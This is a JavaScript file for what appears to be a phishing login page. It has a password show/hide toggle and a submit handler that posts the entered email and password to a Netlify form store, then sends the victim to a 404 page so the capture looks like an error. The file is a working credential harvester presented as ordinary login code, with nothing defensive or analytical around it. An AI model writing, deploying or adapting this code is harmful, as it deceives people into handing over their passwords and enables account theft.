const passwordInput = document.getElementById('password');
const showPasswordIcon = document.getElementById('show-password-icon');
const hidePasswordIcon = document.getElementById('hide-password-icon');
const form = document.querySelector('form');


showPasswordIcon.addEventListener('click', function() {
  passwordInput.type = 'text';
  showPasswordIcon.style.display = 'none';
  hidePasswordIcon.style.display = 'block';
});

hidePasswordIcon.addEventListener('click', function() {
  passwordInput.type = 'password';
  hidePasswordIcon.style.display = 'none';
  showPasswordIcon.style.display = 'block';
});


form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  const email = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  
  // Send the user's email and password to Netlify form
  fetch('/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: encode({
      'form-name': 'login-form',
      email,
      password,
    }),
  })
  .then(() => {
    // Display the 404 page
    window.location.href = '404.html';
  })
  .catch((error) => console.error(error));
});

function encode(data) {
  return Object.keys(data)
    .map((key) => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
    .join('&');
}